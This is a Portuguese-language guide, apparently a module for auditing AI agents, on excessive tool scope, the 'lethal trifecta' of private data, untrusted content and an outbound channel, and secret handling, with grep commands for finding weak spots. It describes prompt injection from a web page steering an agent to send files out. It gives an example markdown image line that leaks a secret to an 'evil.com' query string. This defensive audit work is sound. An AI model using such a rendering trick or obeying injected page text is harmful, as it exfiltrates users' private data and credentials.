# Agência e exfiltração

Carregar quando o alvo tem ferramenta de efeito colateral (escrever, enviar, comprar, apagar,
mudar config) ou qualquer canal de saída (rede, arquivo). É a camada onde a injeção vira dano
real: sem uma ferramenta que **age** ou **fala com fora**, uma injeção fica presa na resposta.

O princípio: **o poder do agente é a soma das suas ferramentas, e o atacante herda esse poder se
conseguir dirigir o modelo.** A auditoria é sobre a **composição**, não sobre a ferramenta solta.

---

## 1. Agência excessiva — escopo maior que a tarefa

A falha de maior impacto: o componente pode fazer mais do que precisa. Uma skill de "formatar
texto" que pede `Bash`. Um servidor de "notas" com ferramenta de deletar arquivo arbitrário. Um
agente com `*` de ferramentas "por conveniência".

- O escopo de ferramentas é o **mínimo** da tarefa? Cada poder além disso é superfície de ataque
  sem contrapartida.
- Ferramenta com efeito **irreversível ou externo** (enviar, pagar, apagar, publicar, dar
  permissão) exige **confirmação humana** antes de agir — e a confirmação descreve o efeito
  concreto ("enviar R$ 1.200 para a conta X"), não um "confirmar?" genérico.
- A autorização não fica a cargo do modelo. Quem impõe o limite é o **executor** da ferramenta,
  que revalida quem pode o quê — porque o modelo pode ser persuadido a pedir o que não devia.

```bash
# escopo pedido por uma skill/agente
grep -rniE '(allowed-tools|tools?:|permissions?:|scopes?:).*(\*|Bash|shell|exec|all)' \
  --include='*.md' --include='*.json' --include='*.yaml' . | grep -v node_modules

# efeito colateral sem confirmação aparente
grep -rnE '(sendMail|transfer|delete|unlink|rmdir|purchase|publish|exec)\b' \
  --include='*.ts' --include='*.js' --include='*.py' . | grep -v node_modules | grep -viE 'confirm|approve|dry.?run'
```

## 2. A combinação letal

Cada peça parece benigna; juntas, exfiltram. A regra prática ("lethal trifecta"):

> **acesso a dado privado** + **exposição a conteúdo não confiável** + **um canal para fora** =
> exfiltração possível.

Um agente que lê seus arquivos (privado), resume uma página da web (não confiável) e tem
`fetch` (saída) pode ser instruído pela página a mandar seus arquivos embora. Nenhuma ferramenta
é maliciosa; a **composição** é. Auditar: o alvo reúne os três? Se sim, o que quebra a
combinação — o canal de saída tem allowlist de destino? o dado privado é isolado do fluxo que vê
conteúdo externo?

## 3. O canal de saída como via de exfiltração

Toda ferramenta que fala com fora é uma porta. Duas menos óbvias:

- **Renderização que busca URL.** Se a saída do agente vira Markdown/HTML e o modelo emite
  `![x](https://evil.com/log?d=<segredo>)`, o cliente busca a "imagem" e o segredo vai no query
  string. Sem exfiltração explícita — a renderização faz o trabalho. Auditar: a saída é
  sanitizada antes de renderizar? domínios de imagem/link são restritos?
- **Ferramenta de rede sem allowlist.** `fetch`/`http` como ferramenta, com URL vinda do fluxo,
  deixa o agente injetado mandar dados para onde o texto hostil pedir. É SSRF pela porta do
  agente.

```bash
grep -rnE '(fetch|axios|http\.request|requests\.(get|post)|urllib|Image|markdown)' \
  --include='*.ts' --include='*.js' --include='*.py' . | grep -v node_modules
```

## 4. Saída do modelo como código

Texto gerado tratado como executável é execução remota com um passo a mais. Se a saída do agente
vira `eval`, shell, SQL, caminho de arquivo ou chamada de função por nome, aplique a defesa da
entrada de usuário: parametrizar, allowlist, sanitizar.

```bash
grep -rnE '(eval|exec|os\.system|subprocess|child_process|new Function|vm\.runIn)\s*\(' \
  --include='*.ts' --include='*.js' --include='*.py' . | grep -v node_modules
```

---

## Fronteira de segredo

Quando o agente recebe um token, chave ou credencial, ou os **repassa a uma ferramenta**:

- **O que cruza para o servidor de terceiro?** Token enviado como argumento de uma tool de MCP
  vai para o processo daquele servidor — que é código de terceiro rodando na sua máquina.
  Auditar cada valor sensível que atravessa a fronteira.
- **A chave está no escopo mínimo?** Um agente que só lê não recebe credencial de escrita. Um
  servidor que só precisa de uma API não recebe o `.env` inteiro.
- **O segredo vaza no log/telemetria?** Contexto de agente costuma ir inteiro para observability,
  com prompt, documento recuperado e, às vezes, `Authorization`.

```bash
# env inteiro exposto a uma ferramenta, e segredo em log
grep -rnE 'process\.env\b(?!\.[A-Za-z_])|os\.environ\b(?!\[)|JSON\.stringify\(.*env' --include='*.ts' --include='*.js' --include='*.py' . | grep -v node_modules
grep -rnE '(console\.(log|error)|print|logger)\(.*(token|key|secret|authorization|password)' --include='*.ts' --include='*.js' --include='*.py' . | grep -v node_modules
```

---

## Verificação adversarial nesta camada

Antes de reportar: existe caminho concreto de entrada não confiável até a ferramenta de saída? Um
`fetch` cuja URL só vem de config interna **não** é exfiltração. Uma ferramenta de deletar que já
exige confirmação no executor **não** é agência excessiva. O achado existe quando há entrada
controlável **e** uma saída/efeito que o atacante alcança — a combinação, não a peça.
